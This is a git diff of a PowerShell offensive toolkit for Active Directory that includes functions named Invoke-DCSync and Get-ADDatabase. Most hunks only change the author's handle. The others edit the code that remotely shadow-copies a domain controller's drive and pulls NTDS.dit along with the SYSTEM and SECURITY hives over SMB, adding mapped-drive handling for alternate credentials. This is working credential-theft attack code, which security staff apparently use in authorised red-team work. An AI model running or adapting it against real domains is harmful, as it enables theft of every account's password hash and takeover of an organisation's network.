@@ -5,7 +5,7 @@ function Invoke-DCSync {
 .SYNOPSIS
     Dump domain accounts from Active Directory.
 
-    Author: Timothee MENOCHET (@TiM0)
+    Author: Timothee MENOCHET (@_tmenochet)
 
 .DESCRIPTION
     Invoke-DCSync extracts domain accounts from Active Directory via DCSync attack, including password hashes.
@@ -108,7 +108,7 @@ function Get-ADDatabase {
 .SYNOPSIS
     Steal Active Directory database remotely.
 
-    Author: Timothee MENOCHET (@TiM0)
+    Author: Timothee MENOCHET (@_tmenochet)
 
 .DESCRIPTION
     Get-ADDatabase makes a copy of the NTDS.dit file and related hives from a remote domain controller.
@@ -190,7 +190,7 @@ function Get-ADDatabase {
             do {
                 Start-Sleep -m 250
             }
-            until ((Get-CimInstance -ClassName Win32_process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
+            until ((Get-CimInstance -ClassName Win32_Process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
 
             Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
             if ($Protocol -eq 'Wsman') {
@@ -199,8 +199,15 @@ function Get-ADDatabase {
             }
             else {
                 # Download files via SMB
-                $remoteDir = "\\$Server\$($tempDir -Replace ":","$")"
-                Copy-Item -Recurse -Path "$remoteDir" -Destination "$TargetDirectory" -Credential $Credential
+                if ($Credential.Username) {
+                    $drive = "S"
+                    New-PSDrive -Name $drive -Root "\\$Server\C`$" -Credential $Credential -PSProvider "FileSystem" | Out-Null
+                    Copy-Item -Recurse -Path $($tempDir -Replace "C:","${drive}:") -Destination "$TargetDirectory"
+                    Remove-PSDrive $drive
+                }
+                else {
+                    Copy-Item -Recurse -Path "\\$Server\$($tempDir -Replace ":","$")" -Destination "$TargetDirectory"
+                }
             }
 
             # Delete the temporary directory
@@ -208,6 +215,11 @@ function Get-ADDatabase {
             Get-CimInstance -ClassName Win32_Directory -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession | Remove-CimInstance
         }
         else {
+            if ($Credential.Username -and $Protocol -eq 'Dcom') {
+                Write-Warning "Alternative credentials can't be used with the ShadowCopy method through DCOM."
+                return
+            }
+
             Write-Host "[*] Grabbing the location of the ntds.dit file on $Server"
             $HKLM = [uint32]2147483650
             $key = "SYSTEM\\CurrentControlSet\\Services\\NTDS\Parameters"
@@ -217,7 +229,6 @@ function Get-ADDatabase {
             $edbRelativePath = "$($ditPath.Split('\')[1..($ditPath.Split('\').Length - 2)] -Join '\')\edb.log"
             $ditDrive = $ditPath.Split("\")[0]
 
-            # Create a shadow copy of the corresponding drive
             Write-Host "[*] Creating a shadow copy of volume '$ditDrive\'"
             $process = Invoke-CimMethod -ClassName Win32_ShadowCopy -Name Create -Arguments @{Context="ClientAccessible"; Volume="$ditDrive\"} -CimSession $cimSession
             $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$($process.ShadowID)'" -CimSession $cimSession
@@ -264,8 +275,8 @@ function Get-ADDatabase {
                 $shadowPath = $shadowCopy.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
                 $ditBackupPath = "\\$Server\$($ditDrive -Replace ':', '$')\$shadowPath\$ditRelativePath"
                 $edbBackupPath = "\\$Server\$($ditDrive -Replace ':', '$')\$shadowPath\$edbRelativePath"
-                Copy-Item -Path "$ditBackupPath" -Destination "$TargetDirectory" -Credential $Credential
-                Copy-Item -Path "$edbBackupPath" -Destination "$TargetDirectory" -Credential $Credential
+                Copy-Item -Path "$ditBackupPath" -Destination "$TargetDirectory"
+                Copy-Item -Path "$edbBackupPath" -Destination "$TargetDirectory"
             }
 
             if ($ditDrive -ne 'C:') {
@@ -333,8 +344,8 @@ function Get-ADDatabase {
                 $shadowPath = $shadowCopy.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
                 $systemBackupPath = "\\$Server\C$\$shadowPath\Windows\System32\config\SYSTEM"
                 $securityBackupPath = "\\$Server\C$\$shadowPath\Windows\System32\config\SECURITY"
-                Copy-Item -Path "$systemBackupPath" -Destination "$TargetDirectory" -Credential $Credential
-                Copy-Item -Path "$securityBackupPath" -Destination "$TargetDirectory" -Credential $Credential
+                Copy-Item -Path "$systemBackupPath" -Destination "$TargetDirectory"
+                Copy-Item -Path "$securityBackupPath" -Destination "$TargetDirectory"
 
                 # Close the handle
                 $handle.Dispose()
@@ -358,7 +369,7 @@ function Dump-ADDatabase {
 .SYNOPSIS
     Dump domain accounts from an offline Active Directory database.
 
-    Author: Timothee MENOCHET (@TiM0)
+    Author: Timothee MENOCHET (@_tmenochet)
 
 .DESCRIPTION
     Dump-ADDatabase extracts domain accounts from NTDS database and SYSTEM hive files, including password hashes.
@@ -432,7 +443,7 @@ function Mount-ADDatabase {
 .SYNOPSIS
     Mount an Active Directory database locally.
 
-    Author: Timothee MENOCHET (@TiM0)
+    Author: Timothee MENOCHET (@_tmenochet)
 
 .DESCRIPTION
     Mount-ADDatabase exposes a NTDS database file as a Lightweight Directory Access Protocol (LDAP) server using DSAMain.exe.
@@ -518,7 +529,7 @@ function Invoke-LdapSearch {
 .SYNOPSIS
     Search for domain objects in Active Directory.
 
-    Author: Timothee MENOCHET (@TiM0)
+    Author: Timothee MENOCHET (@_tmenochet)
 
 .DESCRIPTION
     Invoke-LdapSearch builds a directory searcher object using ADSI and searches for objects matching a custom LDAP filter.
